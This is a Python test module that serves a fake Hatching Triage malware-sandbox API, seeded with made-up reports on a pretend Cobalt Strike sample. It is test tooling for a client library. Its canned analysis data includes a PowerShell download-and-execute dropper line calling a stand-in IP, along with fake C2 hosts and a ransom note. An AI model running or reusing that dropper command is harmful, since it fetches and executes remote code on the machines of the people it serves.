"""A fake Hatching Triage API server for tests.

``FakeTriage`` serves every endpoint ``PyHatchingClient`` uses, from an in-memory
state seeded with one fully reported sample (``SAMPLE_ID``), and records each request
so tests can assert exactly what was sent. It's used by pyhatching's own tests and is
meant to be reused by projects built on pyhatching::

    async with FakeTriage() as fake:
        async with PyHatchingClient(fake.apikey, url=fake.url) as client:
            report = await client.overview(SAMPLE_ID)
            assert fake.requests[-1]["path"] == f"/api/v1/samples/{SAMPLE_ID}/overview.json"

The canned data follows the shapes of Hatching's official API clients, it is not
copied from real analyses.
"""

import copy
import hashlib
import io
import json
import tarfile
import zipfile
from typing import Any

from aiohttp import web


# web.RequestKey is only in newer aiohttp versions.
RECORD = web.RequestKey("record", dict) if hasattr(web, "RequestKey") else "record"
"""The request storage key of a request's record."""


APIKEY = "testkey"
"""The API key ``FakeTriage`` accepts by default."""

SAMPLE_ID = "261031-a1b2c3d4e5"
"""The ID of the seeded, fully reported, sample."""

SAMPLE_BYTES = b"MZ\x90\x00 pyhatching fake sample"
"""The seeded sample's file contents."""

SAMPLE_MD5 = hashlib.md5(SAMPLE_BYTES).hexdigest()
SAMPLE_SHA1 = hashlib.sha1(SAMPLE_BYTES).hexdigest()
SAMPLE_SHA256 = hashlib.sha256(SAMPLE_BYTES).hexdigest()
SAMPLE_SHA512 = hashlib.sha512(SAMPLE_BYTES).hexdigest()
SAMPLE_SSDEEP = "3:abcdefgh:ijklmnop"

DROPPED_BYTES = b"MZ dropped payload"
"""The contents of the file dumped during the seeded sample's behavioral1 task."""

DROPPED_SHA256 = hashlib.sha256(DROPPED_BYTES).hexdigest()

PCAP_BYTES = b"\xd4\xc3\xb2\xa1fake pcap"
SCREENSHOT_BYTES = b"\x89PNG fake screenshot"

SUBMITTED = "2026-10-31T12:00:00Z"
COMPLETED = "2026-10-31T12:05:00Z"

SAMPLE = {
    "id": SAMPLE_ID,
    "status": "reported",
    "kind": "file",
    "filename": "invoice.exe",
    "private": False,
    "tasks": [
        {"id": "static1", "status": "reported"},
        {"id": "behavioral1", "status": "reported", "target": "invoice.exe"},
    ],
    "submitted": SUBMITTED,
    "completed": COMPLETED,
}

SIGNATURES = [
    {
        "label": "cobaltstrike",
        "name": "Cobaltstrike",
        "score": 10,
        "tags": ["family:cobaltstrike", "backdoor", "trojan"],
        "desc": "Detects Cobalt Strike Beacon payloads.",
    },
    {
        "label": "persistence_runkey",
        "name": "Adds Run key to start application",
        "score": 6,
        "ttp": ["T1547.001"],
        "tags": ["persistence"],
        "indicators": [
            {
                "ioc": "\\REGISTRY\\USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd",
                "pid": 2044,
                "procid": 1,
            }
        ],
    },
    {
        "name": "Suspicious use of SetWindowsHookEx",
        "score": 3,
        "ttp": ["T1056.001"],
    },
]

CONFIG = {
    "family": "cobaltstrike",
    "rule": "CobaltStrike",
    "c2": ["http://198.51.100.7:443/jquery-3.3.1.min.js", "evil.example.com:8080"],
    "version": "4.9",
    "botnet": "1359593325",
    "mutex": ["Global\\cs-mutex"],
    "keys": [{"kind": "rsa_pubkey", "key": "publickey", "value": "MIGfMA0GCSq..."}],
    "attr": {"watermark": 1359593325, "sleep_time": 60000},
    "credentials": [
        {"protocol": "smtp", "host": "mail.example.com", "port": 587,
         "username": "bot@example.com", "password": "hunter2"},
    ],
}

TASK_SUMMARIES = [
    {
        "sample": SAMPLE_ID,
        "kind": "static",
        "name": "static1",
        "status": "reported",
        "score": 3,
        "tags": ["upx"],
    },
    {
        "sample": SAMPLE_ID,
        "kind": "behavioral",
        "name": "behavioral1",
        "status": "reported",
        "ttp": ["T1547.001", "T1056.001"],
        "tags": ["family:cobaltstrike", "backdoor", "trojan", "persistence"],
        "score": 10,
        "target": "invoice.exe",
        "backend": "sbx1",
        "resource": "win10v2004-20260901-en",
        "platform": "windows10-2004_x64",
        "os": "windows10-2004_x64",
        "task_name": "invoice.exe",
        "timeout": 150,
        "sigs": 3,
    },
]

OVERVIEW = {
    "version": "0.3.1",
    "sample": {
        "id": SAMPLE_ID,
        "score": 10,
        "target": "invoice.exe",
        "size": len(SAMPLE_BYTES),
        "md5": SAMPLE_MD5,
        "sha1": SAMPLE_SHA1,
        "sha256": SAMPLE_SHA256,
        "sha512": SAMPLE_SHA512,
        "ssdeep": SAMPLE_SSDEEP,
        "filetype": "PE32 executable (GUI) Intel 80386, for MS Windows",
        "static_tags": ["upx"],
        "submitted": SUBMITTED,
        "created": SUBMITTED,
        "completed": COMPLETED,
        "iocs": {
            "urls": ["http://198.51.100.7/jquery-3.3.1.min.js"],
            "domains": ["evil.example.com"],
            "ips": ["198.51.100.7"],
        },
    },
    "tasks": TASK_SUMMARIES,
    "analysis": {
        "score": 10,
        "family": ["cobaltstrike"],
        "tags": ["family:cobaltstrike", "backdoor", "trojan", "persistence", "upx"],
    },
    "targets": [
        {
            "tasks": ["behavioral1"],
            "id": SAMPLE_ID,
            "score": 10,
            "submitted": SUBMITTED,
            "completed": COMPLETED,
            "target": "invoice.exe",
            "size": len(SAMPLE_BYTES),
            "md5": SAMPLE_MD5,
            "sha1": SAMPLE_SHA1,
            "sha256": SAMPLE_SHA256,
            "sha512": SAMPLE_SHA512,
            "ssdeep": SAMPLE_SSDEEP,
            "filetype": "PE32 executable (GUI) Intel 80386, for MS Windows",
            "static_tags": ["upx"],
            "tags": ["family:cobaltstrike", "backdoor", "trojan", "persistence"],
            "family": ["cobaltstrike"],
            "signatures": SIGNATURES,
            "iocs": {
                "urls": ["http://198.51.100.7/jquery-3.3.1.min.js"],
                "domains": ["evil.example.com"],
                "ips": ["198.51.100.7"],
            },
        }
    ],
    "signatures": SIGNATURES,
    "extracted": [
        {
            "tasks": ["behavioral1"],
            "dumped_file": "memory/2044-1-0x0000000000400000-0x0000000000450000.dmp",
            "resource": "behavioral1/memory/2044-1-0x0000000000400000-0x0000000000450000.dmp",
            "config": CONFIG,
        },
        {
            "tasks": ["behavioral1"],
            "dropper": {
                "language": "ps1",
                "source": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')",
                "deobfuscated": "",
                "urls": [{"type": "url", "url": "http://203.0.113.9/a.ps1"}],
            },
        },
        {
            "tasks": ["behavioral1"],
            "ransom_note": {
                "family": "lockbit",
                "note": "Your files are encrypted.",
                "emails": ["pay@example.org"],
                "wallets": ["bc1qexamplewallet"],
                "urls": ["http://ransom.example.onion/"],
            },
        },
    ],
}

STATIC_REPORT = {
    "version": "0.2.3",
    "sample": {
        "sample": SAMPLE_ID,
        "kind": "file",
        "size": len(SAMPLE_BYTES),
        "target": "invoice.exe",
        "submitted": SUBMITTED,
    },
    "task": {"task": f"{SAMPLE_ID}-static1", "target": "invoice.exe"},
    "analysis": {"reported": COMPLETED, "score": 3, "tags": ["upx"]},
    "signatures": [{"name": "UPX packed file", "score": 3, "tags": ["upx"]}],
    "files": [
        {
            "filename": "invoice.exe",
            "filesize": len(SAMPLE_BYTES),
            "md5": SAMPLE_MD5,
            "sha1": SAMPLE_SHA1,
            "sha256": SAMPLE_SHA256,
            "sha512": SAMPLE_SHA512,
            "ssdeep": SAMPLE_SSDEEP,
            "exts": [".exe"],
            "tags": ["upx"],
            "filetype": "PE32 executable (GUI) Intel 80386, for MS Windows",
            "mime": "application/x-dosexec",
            "depth": 0,
            "kind": "exe",
            "selected": True,
            "runas": "invoice.exe",
        }
    ],
    "unpack_count": 1,
    "error_count": 0,
}

TASK_REPORT = {
    "version": "0.3.1",
    "sample": {
        "id": SAMPLE_ID,
        "score": 10,
        "submitted": SUBMITTED,
        "target": "invoice.exe",
        "size": len(SAMPLE_BYTES),
        "md5": SAMPLE_MD5,
        "sha1": SAMPLE_SHA1,
        "sha256": SAMPLE_SHA256,
        "sha512": SAMPLE_SHA512,
        "filetype": "PE32 executable (GUI) Intel 80386, for MS Windows",
        "static_tags": ["upx"],
    },
    "task": {"id": "behavioral1", "target": "invoice.exe", "sha256": SAMPLE_SHA256},
    "analysis": {
        "score": 10,
        "tags": ["family:cobaltstrike", "backdoor", "trojan", "persistence"],
        "ttp": ["T1547.001", "T1056.001"],
        "features": ["pcap"],
        "submitted": SUBMITTED,
        "reported": COMPLETED,
        "max_time_network": 140000,
        "max_time_kernel": 150000,
        "backend": "sbx1",
        "resource": "win10v2004-20260901-en",
        "platform": "windows10-2004_x64",
    },
    # Like the live API, orig is set on every process in the sample's process tree, not
    # only on the process that ran the sample.
    "processes": [
        {
            "procid": 1,
            "procid_parent": 0,
            "pid": 2044,
            "ppid": 1012,
            "cmd": "\"C:\\Users\\Admin\\AppData\\Local\\Temp\\invoice.exe\"",
            "image": "C:\\Users\\Admin\\AppData\\Local\\Temp\\invoice.exe",
            "orig": True,
            "started": 1200,
        },
        {
            "procid": 2,
            "procid_parent": 1,
            "pid": 3120,
            "ppid": 2044,
            "cmd": ["C:\\Windows\\System32\\cmd.exe", "/c", "whoami"],
            "image": "C:\\Windows\\System32\\cmd.exe",
            "orig": True,
            "started": 3400,
            "terminated": 3900,
        },
    ],
    "signatures": SIGNATURES,
    "network": {
        "flows": [
            {
                "id": 1,
                "src": "10.127.0.5:49712",
                "dst": "198.51.100.7:443",
                "proto": "tcp",
                "pid": 2044,
                "procid": 1,
                "first_seen": 5000,
                "last_seen": 9000,
                "rx_bytes": 1024,
                "tx_bytes": 512,
                "protocols": ["tls", "http"],
                "domain": "evil.example.com",
                "tls_ja3": "a0e9f5d64349fb13191bc781f81f42e1",
                "tls_ja3s": "15af977ce25de452b96affa2addb1036",
                "tls_sni": "evil.example.com",
            },
            {
                "id": 2,
                "src": "10.127.0.5:53000",
                "dst": "8.8.8.8:53",
                "proto": "udp",
                "protocols": ["dns"],
            },
        ],
        "requests": [
            {
                "flow": 2,
                "index": 1,
                "at": 4900,
                "dns_request": {
                    "domains": ["evil.example.com"],
                    # Like the live API, record types include the class ("IN A").
                    "questions": [{"name": "evil.example.com", "type": "IN A"}],
                },
            },
            {
                "flow": 2,
                "index": 2,
                "at": 4950,
                "dns_response": {
                    "domains": ["evil.example.com"],
                    "ip": ["198.51.100.7"],
                    "answers": [{"name": "evil.example.com", "type": "IN A", "value": "198.51.100.7"}],
                },
            },
            {
                "flow": 1,
                "index": 3,
                "at": 5100,
                "http_request": {
                    "method": "GET",
                    "url": "http://evil.example.com/jquery-3.3.1.min.js",
                    "request": "GET /jquery-3.3.1.min.js HTTP/1.1",
                    "headers": ["Host: evil.example.com", "User-Agent: Mozilla/5.0 (fake)"],
                },
            },
            {
                "flow": 1,
                "index": 4,
                "at": 5200,
                "http_response": {
                    "status": "200",
                    "response": "HTTP/1.1 200 OK",
                    "headers": ["Server: nginx"],
                },
            },
        ],
        "ips": {"198.51.100.7": {"cidr": "198.51.100.0/24", "cc": "US", "asn": "AS64500"}},
    },
    "dumped": [
        {
            "at": 6000,
            "pid": 2044,
            "procid": 1,
            "path": "C:\\Users\\Admin\\AppData\\Roaming\\upd.exe",
            "name": "files/0x0003000000022c2b-1.dat",
            "kind": "martian",
            "md5": hashlib.md5(DROPPED_BYTES).hexdigest(),
            "sha1": hashlib.sha1(DROPPED_BYTES).hexdigest(),
            "sha256": DROPPED_SHA256,
            "sha512": hashlib.sha512(DROPPED_BYTES).hexdigest(),
            "size": len(DROPPED_BYTES),
        },
        {
            "at": 7000,
            "pid": 2044,
            "procid": 1,
            "name": "memory/2044-1-0x0000000000400000-0x0000000000450000.dmp",
            "kind": "region",
            "addr": 4194304,
            "length": 327680,
        },
    ],
    "extracted": [
        {
            "dumped_file": "memory/2044-1-0x0000000000400000-0x0000000000450000.dmp",
            "resource": "behavioral1/memory/2044-1-0x0000000000400000-0x0000000000450000.dmp",
            "config": CONFIG,
        }
    ],
}

SUMMARY = {
    "sample": SAMPLE_ID,
    "status": "reported",
    "kind": "file",
    "owner": "test@example.com",
    "target": "invoice.exe",
    "score": 10,
    "sha256": SAMPLE_SHA256,
    "created": SUBMITTED,
    "completed": COMPLETED,
    "tasks": {
        f"{SAMPLE_ID}-static1": {"kind": "static", "status": "reported", "score": 3},
        f"{SAMPLE_ID}-behavioral1": {
            "kind": "behavioral",
            "status": "reported",
            "score": 10,
            "tags": ["family:cobaltstrike"],
            "resource": "win10v2004-20260901-en",
            "platform": "windows10-2004_x64",
        },
    },
}

KERNEL_EVENTS = [
    {"kind": "onemon.Process", "time": 1200, "pid": 2044, "image": "invoice.exe"},
    {"kind": "onemon.Registry", "time": 3000, "pid": 2044, "key": "Run\\upd"},
]

PROFILE = {
    "id": "f4b9a3c2-1d2e-4f5a-8b6c-7d8e9f0a1b2c",
    "name": "win10-internet",
    "tags": ["windows10"],
    "network": "internet",
    "timeout": 150,
}

YARA_RULE = {
    "name": "fake_rule.yara",
    "rule": 'rule fake_rule { strings: $a = "pyhatching" condition: $a }',
    "warnings": [],
}

URLSCAN_REPORT = {
    "version": "0.1.0",
    "task": f"{SAMPLE_ID}-urlscan1",
    "url": "http://evil.example.com/login",
    "effective_url": "https://evil.example.com/login",
    "requests": [{"url": "https://evil.example.com/login", "status": 200}],
    "verdict": {"score": 10, "tags": ["phishing"]},
}

MAGIC_TOKEN = "fakemagictoken1234567890"
"""The magic link token returned for any seeded sample."""

RESOURCES = [
    {
        "resources": [
            {"name": "win10v2004-20260901-en", "tags": ["os:windows10-2004-x64", "locale:en-us"]},
            {"name": "ubuntu-2204-amd64", "tags": ["os:ubuntu-22.04-amd64"]},
        ]
    }
]

GEOLOCATIONS = [
    {
        "geolocations": [
            {"name": "us", "tags": ["geo:us"]},
            {"name": "de", "tags": ["geo:de"]},
        ]
    }
]

USER = {
    "id": "8c2e3f40-5a6b-4c7d-9e8f-0a1b2c3d4e5f",
    "username": "analyst",
    "first_name": "Ann",
    "last_name": "Alyst",
    "email": "analyst@example.com",
    "created_at": SUBMITTED,
    "company_id": "company-1",
    "permissions": ["view_samples", "submit_samples"],
}

EVENTS = ["pending", "static_analysis", "scheduled", "running", "processing", "reported"]
"""The statuses streamed by the events endpoints."""


def _err(status: int, error: str, message: str) -> web.Response:
    return web.json_response({"error": error, "message": message}, status=status)


class FakeTriage:
    """A fake Hatching Triage API, see the module docs.

    Attributes
    ----------
    url : str
        The URL to pass to ``PyHatchingClient`` (the API is served under ``/api``).
    apikey : str
        The API key the server accepts.
    requests : list[dict]
        Every request received: ``method``, ``path``, ``query``, ``headers``, ``json``
        (for JSON bodies), ``form`` (multipart fields), and ``files`` (multipart files).
    samples, profiles, rules, users, apikeys : dict
        The server's state, which tests may change.
    """

    def __init__(self, apikey: str = APIKEY) -> None:
        self.apikey = apikey
        self.url = ""
        self.requests: list[dict] = []
        self.samples: dict[str, dict] = {SAMPLE_ID: copy.deepcopy(SAMPLE)}
        self.files: dict[str, bytes] = {SAMPLE_ID: SAMPLE_BYTES}
        self.overviews: dict[str, dict] = {SAMPLE_ID: copy.deepcopy(OVERVIEW)}
        self.statics: dict[str, dict] = {SAMPLE_ID: copy.deepcopy(STATIC_REPORT)}
        self.summaries: dict[str, dict] = {SAMPLE_ID: copy.deepcopy(SUMMARY)}
        self.task_reports: dict[tuple[str, str], dict] = {
            (SAMPLE_ID, "behavioral1"): copy.deepcopy(TASK_REPORT)
        }
        self.task_files: dict[tuple[str, str, str], bytes] = {
            (SAMPLE_ID, "behavioral1", "dump.pcap"): PCAP_BYTES,
            (SAMPLE_ID, "behavioral1", "dump.pcapng"): PCAP_BYTES,
            (SAMPLE_ID, "behavioral1", "files/0x0003000000022c2b-1.dat"): DROPPED_BYTES,
            (SAMPLE_ID, "behavioral1", "logs/onemon.json"): b"".join(
                json.dumps(e).encode() + b"\n" for e in KERNEL_EVENTS
            ),
            (SAMPLE_ID, "urlscan1", "screenshot.png"): SCREENSHOT_BYTES,
        }
        self.urlscans: dict[tuple[str, str], dict] = {
            (SAMPLE_ID, "urlscan1"): copy.deepcopy(URLSCAN_REPORT)
        }
        self.org_settings: dict[str, Any] = {"magic_link": {"enabled": True}}
        self.profiles: dict[str, dict] = {PROFILE["id"]: copy.deepcopy(PROFILE)}
        self.rules: dict[str, dict] = {YARA_RULE["name"]: copy.deepcopy(YARA_RULE)}
        self.users: dict[str, dict] = {USER["id"]: copy.deepcopy(USER)}
        self.apikeys: dict[str, list[dict]] = {USER["id"]: [{"name": "default", "key": "k" * 40}]}
        self.counter = 0
        self.runner: web.AppRunner | None = None

    async def __aenter__(self) -> "FakeTriage":
        await self.start()
        return self

    async def __aexit__(self, *args) -> None:
        await self.stop()

    async def start(self) -> None:
        """Start the server on a random localhost port and set ``url``."""

        app = web.Application(middlewares=[self._middleware], client_max_size=64 * 1024 * 1024)
        self._routes(app)
        self.runner = web.AppRunner(app)
        await self.runner.setup()
        site = web.TCPSite(self.runner, "127.0.0.1", 0)
        await site.start()
        port = site._server.sockets[0].getsockname()[1]  # pylint: disable=W0212
        self.url = f"http://127.0.0.1:{port}"

    async def stop(self) -> None:
        """Stop the server."""

        if self.runner is not None:
            await self.runner.cleanup()

    def last(self, method: str | None = None, path: str | None = None) -> dict | None:
        """The last recorded request, optionally the last one matching a method and path suffix."""

        for req in reversed(self.requests):
            if method and req["method"] != method.upper():
                continue
            if path and not req["path"].endswith(path):
                continue
            return req
        return None

    @web.middleware
    async def _middleware(self, request: web.Request, handler) -> web.StreamResponse:
        record: dict[str, Any] = {
            "method": request.method,
            "path": request.path,
            "query": dict(request.query),
            "headers": dict(request.headers),
            "json": None,
            "form": {},
            "files": {},
        }
        if request.content_type == "application/json" and request.can_read_body:
            try:
                record["json"] = await request.json()
            except ValueError:
                record["json"] = None
        elif request.content_type.startswith("multipart/"):
            reader = await request.multipart()
            async for part in reader:
                if part.filename is not None:
                    record["files"][part.name] = (part.filename, await part.read())
                else:
                    record["form"][part.name] = await part.text()
        self.requests.append(record)
        request[RECORD] = record

        if request.headers.get("Authorization") != f"Bearer {self.apikey}":
            return _err(401, "UNAUTHORIZED", "Missing or invalid credentials.")
        return await handler(request)

    def _routes(self, app: web.Application) -> None:
        r = app.router
        r.add_post("/api/v0/samples", self.submit)
        r.add_get("/api/v0/samples", self.listSamples)
        r.add_get("/api/v0/search", self.search)
        r.add_get("/api/v0/samples/events", self.allEvents)
        r.add_get("/api/v0/samples/{sid}", self.getSample)
        r.add_delete("/api/v0/samples/{sid}", self.deleteSample)
        r.add_post("/api/v0/samples/{sid}/profile", self.setProfile)
        r.add_get("/api/v0/samples/{sid}/events", self.sampleEvents)
        r.add_get("/api/v0/samples/{sid}/sample", self.sampleFile)
        r.add_get("/api/v0/samples/{sid}/archive", self.archive)
        r.add_get("/api/v0/samples/{sid}/archive.zip", self.archive)
        r.add_get("/api/v0/samples/{sid}/summary", self.summary)
        r.add_get("/api/v0/samples/{sid}/magic", self.magic)
        r.add_get("/api/v0/samples/{sid}/reports/static", self.staticReport)
        r.add_get("/api/v1/samples/{sid}/overview.json", self.overview)
        r.add_get("/api/v0/samples/{sid}/{task}/report_triage.json", self.taskReport)
        r.add_get("/api/v0/samples/{sid}/{task}/report_urlscan.json", self.urlscanReport)
        r.add_get("/api/v0/samples/{sid}/{task}/{name:.+}", self.taskFile)
        r.add_get("/api/v0/resources", self.resources)
        r.add_get("/api/v0/geolocations", self.geolocations)
        r.add_get("/api/v0/stats/user", self.stats)
        r.add_get("/api/v0/stats/org", self.stats)
        r.add_get("/api/v0/org/settings", self.orgSettings)
        r.add_put("/api/v0/org/settings/magic", self.setMagicLink)
        r.add_get("/api/v0/profiles", self.listProfiles)
        r.add_post("/api/v0/profiles", self.createProfile)
        r.add_get("/api/v0/profiles/{pid}", self.getProfile)
        r.add_put("/api/v0/profiles/{pid}", self.updateProfile)
        r.add_delete("/api/v0/profiles/{pid}", self.deleteProfile)
        r.add_get("/api/v0/yara", self.listRules)
        r.add_post("/api/v0/yara", self.createRule)
        r.add_get("/api/v0/yara/{name}", self.getRule)
        r.add_put("/api/v0/yara/{name}", self.updateRule)
        r.add_delete("/api/v0/yara/{name}", self.deleteRule)
        r.add_get("/api/v0/users", self.listUsers)
        r.add_post("/api/v0/users", self.createUser)
        r.add_get("/api/v0/users/{uid}", self.getUser)
        r.add_delete("/api/v0/users/{uid}", self.deleteUser)
        r.add_get("/api/v0/users/{uid}/apikeys", self.listKeys)
        r.add_post("/api/v0/users/{uid}/apikeys", self.createKey)
        r.add_delete("/api/v0/users/{uid}/apikeys/{name}", self.deleteKey)

    # ---- Helpers ----

    def _sample(self, request: web.Request) -> dict | None:
        return self.samples.get(request.match_info["sid"])

    @staticmethod
    def _notfound(what: str = "sample") -> web.Response:
        return _err(404, "NOT_FOUND", f"The {what} was not found.")

    @staticmethod
    def _page(request: web.Request, items: list) -> web.Response:
        # The API's default page size is 50, and its max is 200.
        limit = min(int(request.query.get("limit", 50)), 200)
        offset = int(request.query.get("offset", 0) or 0)
        data = items[offset:offset + limit]
        nxt = str(offset + limit) if offset + limit < len(items) else None
        return web.json_response({"data": data, "next": nxt})

    def matches(self, sample: dict, query: str) -> bool:
        """Whether a sample matches a (very simplified) Triage search query."""

        overview = self.overviews.get(sample["id"], {})
        info = overview.get("sample", {})
        for term in query.split(" "):
            if ":" not in term:
                continue
            key, valu = term.split(":", 1)
            valu = valu.strip('"')
            if key == "url":
                if sample.get("url") != valu:
                    return False
            elif key in ("md5", "sha1", "sha256", "sha512", "ssdeep"):
                if info.get(key, "").lower() != valu.lower():
                    return False
            elif key == "family":
                if valu not in overview.get("analysis", {}).get("family", []):
                    return False
            elif key == "tag":
                if valu not in overview.get("analysis", {}).get("tags", []):
                    return False
        return True

    # ---- Samples ----

    async def submit(self, request: web.Request) -> web.Response:
        """POST /v0/samples - JSON for url/fetch, multipart (_json + file) for files."""

        record = request[RECORD]
        if record["files"]:
            try:
                body = json.loads(record["form"].get("_json") or "{}")
            except ValueError:
                return _err(400, "BAD_REQUEST", "Invalid _json field.")
            filename, byts = record["files"].get("file", (None, b""))
        else:
            body = record["json"] or {}
            filename, byts = None, None

        kind = body.get("kind")
        if kind not in ("file", "url", "fetch", "import"):
            return _err(400, "INVALID", "Invalid kind.")
        if kind == "file" and not byts:
            return _err(400, "INVALID", "No file was uploaded.")
        if kind in ("url", "fetch", "import") and not body.get("url"):
            return _err(400, "INVALID", "No url was given.")

        self.counter += 1
        sid = f"261031-new{self.counter:06d}"
        sample = {
            "id": sid,
            "status": "static_analysis" if body.get("interactive") else "pending",
            "kind": kind,
            "private": True,
            "submitted": SUBMITTED,
        }
        if kind == "file":
            sample["filename"] = body.get("target") or filename
            self.files[sid] = byts
        elif kind == "import":
            # Imported samples are file samples copied from a public analysis.
            sample["kind"] = "file"
            sample["filename"] = body["url"].rstrip("/").rsplit("/", 1)[-1]
        else:
            sample["url"] = body["url"]
            if kind == "fetch":
                sample["filename"] = body["url"].rsplit("/", 1)[-1]
        self.samples[sid] = sample
        return web.json_response(sample)

    async def listSamples(self, request: web.Request) -> web.Response:
        subset = request.query.get("subset", "owned")
        if subset not in ("owned", "public", "org"):
            return _err(400, "INVALID", "Invalid subset.")
        return self._page(request, list(reversed(list(self.samples.values()))))

    async def search(self, request: web.Request) -> web.Response:
        query = request.query.get("query", "")
        hits = [s for s in reversed(list(self.samples.values())) if self.matches(s, query)]
        return self._page(request, hits)

    async def getSample(self, request: web.Request) -> web.Response:
        sample = self._sample(request)
        if sample is None:
            return self._notfound()
        return web.json_response(sample)

    async def deleteSample(self, request: web.Request) -> web.Response:
        if self.samples.pop(request.match_info["sid"], None) is None:
            return self._notfound()
        return web.json_response({})

    async def setProfile(self, request: web.Request) -> web.Response:
        sample = self._sample(request)
        if sample is None:
            return self._notfound()
        if sample["status"] != "static_analysis":
            return _err(400, "PROFILE_NOT_SETTABLE", "The sample is not awaiting a profile.")
        sample["status"] = "scheduled"
        return web.json_response({})

    async def _events(self, request: web.Request, samples: list[dict]) -> web.StreamResponse:
        resp = web.StreamResponse(headers={"Content-Type": "application/x-ndjson"})
        await resp.prepare(request)
        for sample in samples:
            for status in EVENTS:
                await resp.write(json.dumps(dict(sample, status=status)).encode() + b"\n")
            # The analysis is done once its events end.
            sample.update(status="reported", completed=COMPLETED)
        await resp.write_eof()
        return resp

    async def sampleEvents(self, request: web.Request) -> web.StreamResponse:
        sample = self._sample(request)
        if sample is None:
            return self._notfound()
        return await self._events(request, [sample])

    async def allEvents(self, request: web.Request) -> web.StreamResponse:
        return await self._events(request, list(self.samples.values())[:1])

    async def sampleFile(self, request: web.Request) -> web.Response:
        byts = self.files.get(request.match_info["sid"])
        if byts is None:
            return self._notfound()
        return web.Response(body=byts, content_type="application/octet-stream")

    async def archive(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        if sid not in self.samples:
            return self._notfound()
        contents = {"sample": self.files.get(sid, b""),
                    "overview.json": json.dumps(self.overviews.get(sid, {})).encode()}
        buf = io.BytesIO()
        if request.path.endswith(".zip"):
            with zipfile.ZipFile(buf, "w") as zfd:
                for name, byts in contents.items():
                    zfd.writestr(f"{sid}/{name}", byts)
        else:
            with tarfile.open(fileobj=buf, mode="w") as tfd:
                for name, byts in contents.items():
                    info = tarfile.TarInfo(f"{sid}/{name}")
                    info.size = len(byts)
                    tfd.addfile(info, io.BytesIO(byts))
        return web.Response(body=buf.getvalue(), content_type="application/octet-stream")

    def _report(self, store: dict, key: Any) -> web.Response:
        report = store.get(key)
        if report is None:
            return _err(404, "REPORT_NOT_AVAILABLE", "The report is not available.")
        return web.json_response(report)

    async def summary(self, request: web.Request) -> web.Response:
        return self._report(self.summaries, request.match_info["sid"])

    async def staticReport(self, request: web.Request) -> web.Response:
        return self._report(self.statics, request.match_info["sid"])

    async def overview(self, request: web.Request) -> web.Response:
        return self._report(self.overviews, request.match_info["sid"])

    async def taskReport(self, request: web.Request) -> web.Response:
        return self._report(self.task_reports, (request.match_info["sid"], request.match_info["task"]))

    async def urlscanReport(self, request: web.Request) -> web.Response:
        return self._report(self.urlscans, (request.match_info["sid"], request.match_info["task"]))

    async def magic(self, request: web.Request) -> web.Response:
        if self._sample(request) is None:
            return self._notfound()
        if not self.org_settings.get("magic_link", {}).get("enabled"):
            return _err(403, "FORBIDDEN", "Magic links are disabled.")
        return web.json_response({"token": MAGIC_TOKEN})

    # ---- Resources, geolocations, stats, and org settings ----

    async def resources(self, request: web.Request) -> web.Response:
        return web.json_response({"data": RESOURCES})

    async def geolocations(self, request: web.Request) -> web.Response:
        return web.json_response({"data": GEOLOCATIONS})

    async def stats(self, request: web.Request) -> web.Response:
        return web.json_response({"samples_submitted": len(self.samples)})

    async def orgSettings(self, request: web.Request) -> web.Response:
        return web.json_response(self.org_settings)

    async def setMagicLink(self, request: web.Request) -> web.Response:
        body = request[RECORD]["json"] or {}
        if not isinstance(body.get("enabled"), bool):
            return _err(400, "INVALID", "enabled must be a boolean.")
        self.org_settings["magic_link"] = {"enabled": body["enabled"]}
        return web.json_response({})

    async def taskFile(self, request: web.Request) -> web.Response:
        key = (request.match_info["sid"], request.match_info["task"], request.match_info["name"])
        byts = self.task_files.get(key)
        if byts is None:
            return self._notfound("file")
        return web.Response(body=byts, content_type="application/octet-stream")

    # ---- Profiles ----

    def _profile(self, request: web.Request) -> dict | None:
        pid = request.match_info["pid"]
        if pid in self.profiles:
            return self.profiles[pid]
        for profile in self.profiles.values():
            if profile["name"] == pid:
                return profile
        return None

    async def listProfiles(self, request: web.Request) -> web.Response:
        return self._page(request, list(self.profiles.values()))

    async def createProfile(self, request: web.Request) -> web.Response:
        body = request[RECORD]["json"] or {}
        if not body.get("name"):
            return _err(400, "INVALID", "A name is required.")
        if any(p["name"] == body["name"] for p in self.profiles.values()):
            return _err(400, "PROFILE_ALREADY_EXISTS", "A profile with that name already exists.")
        self.counter += 1
        profile = {"id": f"profile-{self.counter}", "name": body["name"],
                   "tags": body.get("tags") or [], "network": body.get("network", ""),
                   "timeout": body.get("timeout", 150)}
        if body.get("geolocation"):
            profile["geolocation"] = body["geolocation"]
        self.profiles[profile["id"]] = profile
        return web.json_response(profile)

    async def getProfile(self, request: web.Request) -> web.Response:
        profile = self._profile(request)
        if profile is None:
            return self._notfound("profile")
        return web.json_response(profile)

    async def updateProfile(self, request: web.Request) -> web.Response:
        profile = self._profile(request)
        if profile is None:
            return self._notfound("profile")
        body = request[RECORD]["json"] or {}
        profile.update({k: v for k, v in body.items()
                        if k in ("name", "tags", "network", "timeout", "geolocation")})
        return web.json_response({})

    async def deleteProfile(self, request: web.Request) -> web.Response:
        profile = self._profile(request)
        if profile is None:
            return self._notfound("profile")
        self.profiles.pop(profile["id"])
        return web.json_response({})

    # ---- Yara ----

    async def listRules(self, request: web.Request) -> web.Response:
        return web.json_response({"rules": list(self.rules.values())})

    async def createRule(self, request: web.Request) -> web.Response:
        body = request[RECORD]["json"] or {}
        name, rule = body.get("name"), body.get("rule")
        if not name or not rule:
            return _err(400, "INVALID", "A name and rule are required.")
        if "condition" not in rule:
            return _err(400, "COMPILE_ERROR", "The rule failed to compile.")
        self.rules[name] = {"name": name, "rule": rule, "warnings": []}
        return web.json_response({})

    async def getRule(self, request: web.Request) -> web.Response:
        rule = self.rules.get(request.match_info["name"])
        if rule is None:
            return self._notfound("rule")
        return web.json_response(rule)

    async def updateRule(self, request: web.Request) -> web.Response:
        name = request.match_info["name"]
        if name not in self.rules:
            return self._notfound("rule")
        body = request[RECORD]["json"] or {}
        if "condition" not in (body.get("rule") or ""):
            return _err(400, "COMPILE_ERROR", "The rule failed to compile.")
        self.rules[name]["rule"] = body["rule"]
        return web.json_response({})

    async def deleteRule(self, request: web.Request) -> web.Response:
        if self.rules.pop(request.match_info["name"], None) is None:
            return self._notfound("rule")
        return web.json_response({})

    # ---- Users ----

    async def listUsers(self, request: web.Request) -> web.Response:
        return self._page(request, list(self.users.values()))
